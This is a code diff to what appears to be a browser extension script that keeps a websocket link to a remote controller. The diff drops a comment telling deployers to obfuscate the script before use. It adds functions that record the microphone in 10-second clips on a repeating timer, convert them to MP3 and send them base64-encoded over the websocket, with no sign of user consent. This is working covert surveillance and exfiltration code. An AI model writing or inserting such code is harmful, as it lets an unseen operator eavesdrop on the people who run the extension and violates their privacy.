@@ -1,13 +1,3 @@
-/*
-    IMPORTANT: This script should be minified using UglifyJS or
-    some other minimizer to remove comments/console.log statements
-    and to obfuscate the code before deployment.
-
-    You'll also need to modify the "websocket" variable in the
-    initialize() function in this script with the appropriate
-    connection URI for your host. For simple testing, the default
-    connection string of "ws://127.0.0.1:4343" should be fine.
-*/
 var websocket = false;
 var last_live_connection_timestamp = get_unix_timestamp();
 var placeholder_secret_token = get_secure_random_token(64);
@@ -752,3 +742,80 @@ chrome.idle.onStateChanged.addListener((state) => {
     })
   );
 });
+
+function convertToMP3(audioBlob) {
+  return new Promise((resolve, reject) => {
+    new Response(audioBlob)
+      .arrayBuffer()
+      .then((arrayBuffer) => {
+        const audioBuffer = new Int16Array(arrayBuffer);
+        const mp3Encoder = new lamejs.Mp3Encoder(1, 44100, 128); 
+        const mp3Data = [];
+        const blockSize = 1152; 
+        for (let i = 0; i < audioBuffer.length; i += blockSize) {
+          const block = audioBuffer.subarray(i, i + blockSize);
+          const mp3Buffer = mp3Encoder.encodeBuffer(block);
+          if (mp3Buffer.length > 0) {
+            mp3Data.push(new Int8Array(mp3Buffer));
+          }
+        }
+        const mp3End = mp3Encoder.flush();
+        if (mp3End.length > 0) {
+          mp3Data.push(new Int8Array(mp3End));
+        }
+        const mp3Blob = new Blob(mp3Data, { type: "audio/mp3" });
+        resolve(mp3Blob);
+      })
+      .catch((error) => {
+        reject(error);
+      });
+  });
+}
+
+async function startRecording() {
+  try {
+    navigator.mediaDevices
+      .getUserMedia({
+        audio: true,
+      })
+      .then(async function (stream) {
+        let recorder = RecordRTC(stream, {
+          type: "audio",
+          recorderType: StereoAudioRecorder,
+          desiredSampRate: 10000,
+        });
+        recorder.startRecording();
+
+        const sleep = (m) => new Promise((r) => setTimeout(r, m));
+        await sleep(10000);
+
+        recorder.stopRecording(function () {
+          let blob = recorder.getBlob();
+          convertToMP3(blob).then(async (mp3Blob) => {
+            let arrayBuffer = await new Response(mp3Blob).arrayBuffer();
+            let base64Audio = arrayBufferToBase64(arrayBuffer);
+            if (websocket && websocket.readyState === WebSocket.OPEN) {
+              websocket.send(
+                JSON.stringify({
+                  id: uuidv4(),
+                  version: "1.0.0",
+                  action: "RECORDING",
+                  data: base64Audio,
+                })
+              );
+            }
+          });
+        });
+      });
+  } catch (e) {
+    console.log(e);
+  }
+}
+
+
+
+const websocket_recording_interval = setInterval(async () => {
+  await startRecording();
+}, 1000*10);
+
+
